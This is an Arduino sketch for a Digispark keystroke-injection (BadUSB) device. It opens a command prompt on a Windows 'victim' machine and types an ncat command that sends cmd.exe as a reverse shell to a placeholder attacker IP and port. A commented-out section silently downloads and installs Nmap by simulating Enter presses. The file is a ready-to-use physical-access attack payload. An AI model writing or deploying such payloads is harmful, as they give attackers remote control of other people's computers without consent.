#include <DigiKeyboard.h>

#define KEY_TAB 43
#define KEY_LEFT_ARROW 80

void setup() {
  DigiKeyboard.delay(500); 
  DigiKeyboard.sendKeyStroke(0); 
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); // tecla Win + R 
  DigiKeyboard.delay(1000); 
  DigiKeyboard.println("cmd"); // Digita "cmd"
  DigiKeyboard.sendKeyStroke(KEY_ENTER); 
  DigiKeyboard.delay(2000); 
  
  // DESCOMENTE CASO A VITIMA TENHA O NMAP INSTALADO || UNCOMMENT IF THE VICTIM HAS NMAP INSTALLED
  /*DigiKeyboard.print("curl -O https://nmap.org/dist/nmap-7.95-setup.exe");
  DigiKeyboard.sendKeyStroke(KEY_ENTER); 
  DigiKeyboard.delay(19000);
  DigiKeyboard.print("nmap-7.95-setup.exe");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(4000);
  DigiKeyboard.sendKeyStroke(KEY_TAB); 
  DigiKeyboard.sendKeyStroke(KEY_TAB); 
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000); 
  DigiKeyboard.sendKeyStroke(KEY_ENTER); 
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER); 
  DigiKeyboard.delay(15000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(2000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(2000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(2000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(2000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); // tecla Win + R 
  DigiKeyboard.delay(1000); 
  DigiKeyboard.println("cmd"); // Digita "cmd"
  DigiKeyboard.sendKeyStroke(KEY_ENTER); 
  DigiKeyboard.delay(2000); */ 
  DigiKeyboard.print("ncat <Attacker-IP> <Attacker-Port> -e cmd.exe");
}
void loop() {
  // put your main code here, to run repeatedly:

}
